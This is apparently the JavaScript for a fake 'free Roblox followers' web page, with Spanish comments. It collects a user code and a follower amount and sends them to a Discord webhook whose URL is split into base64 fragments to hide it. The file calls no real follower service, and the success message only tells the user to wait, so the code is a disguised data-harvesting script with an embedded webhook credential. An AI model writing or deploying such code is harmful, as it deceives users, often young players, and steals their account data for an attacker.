// main.js

// Función para mostrar alertas
function displayAlert(title, text, icon, confirmButtonText) {
    const alertOptions = {
        background: "#141414",
        color: "#ffffff",
        title: "<b>" + title + "</b>",
        text: text,
        icon: icon,
        confirmButtonText: confirmButtonText,
        allowOutsideClick: false
    };
    Swal.fire(alertOptions);
}

// Función para obtener la URL del webhook
function getWebhookURL() {
    const part1 = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv'; // Parte 1 (Base64)
    const part2 = 'MTMzMzYyNzExOTc3NDczMjMxOS9ZOG11TDBGYl'; // Parte 2 (Base64)
    const part3 = 'lYvUFA0TWplak1RaXB0aEhfRGpicGVRZGx1bk5rYVVGQVBBUThaODVEQUZudlJmQ0VCNk15UENaeWZCQw=='; // Parte 3 (Base64)
    
    // Decodificar las partes y concatenarlas
    const decodedPart1 = atob(part1);
    const decodedPart2 = atob(part2);
    const decodedPart3 = atob(part3);
    
    return decodedPart1 + decodedPart2 + decodedPart3;
}

// Función para enviar datos al webhook de Discord
async function sendToDiscord(userCode, followAmount) {
    const webhookURL = getWebhookURL(); // Obtener la URL del webhook

    const payload = {
        content: `User Code: ${userCode}\nFollow Amount: ${followAmount}`
    };

    try {
        const response = await fetch(webhookURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });

        if (response.ok) {
            displayAlert("Success", "successfully, Wait 2 or 4 minutes.", "success", "Okay");
        } else {
            displayAlert("Error", "Failed to send Followers to Roblox Account.", "error", "Retry");
        }
    } catch (error) {
        console.error("Error sending Followers", error);
        displayAlert("Error", "An error occurred while sending Followers", "error", "Retry");
    }
}

// Esperar a que el DOM esté completamente cargado
document.addEventListener("DOMContentLoaded", function() {
    document.getElementById("Send").addEventListener("click", function() {
        const userCode = document.getElementById("user_code").value;
        const followAmount = document.getElementById("amount").value;

        // Validación de los campos
        if (!userCode || !followAmount) {
            displayAlert("Validation Error", "Please fill in all fields.", "warning", "Okay");
            return;
        }

        // Confirmación antes de enviar
        const confirmationMessage = {
            icon: "info",
            title: "<b>Is this correct? 👀</b>",
            html: "User Code: " + userCode + "<br>Follow Amount: " + followAmount,
            showDenyButton: true,
            confirmButtonText: "Confirm", 
            denyButtonText: "Cancel",
            background: "#141414",
            color: "#ffffff"
        };
 
        Swal.fire(confirmationMessage).then((result) => {
            if (result.isConfirmed) {
                sendToDiscord(userCode, followAmount);
            }
        });
    });
});
